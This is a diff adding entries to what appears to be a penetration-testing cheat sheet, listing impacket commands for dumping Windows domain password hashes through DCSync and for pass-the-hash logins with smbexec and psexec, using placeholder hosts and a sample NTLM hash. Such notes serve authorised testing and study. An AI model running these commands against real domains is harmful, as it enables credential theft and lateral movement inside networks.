@@ -78,3 +78,15 @@ prompt off
 mask *
 mget *
 ```
+Using secretsdump to dump domain hashes (needs acc with DC SYNC permissions)
+```
+impacket-secretsdump "DOMAIN/useraccount:Password"@ipadresss
+```
+
+
+Connect with psexec or smbexec using pass the hash
+```
+python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff username@ipadress
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff username@ipadress
+```
+
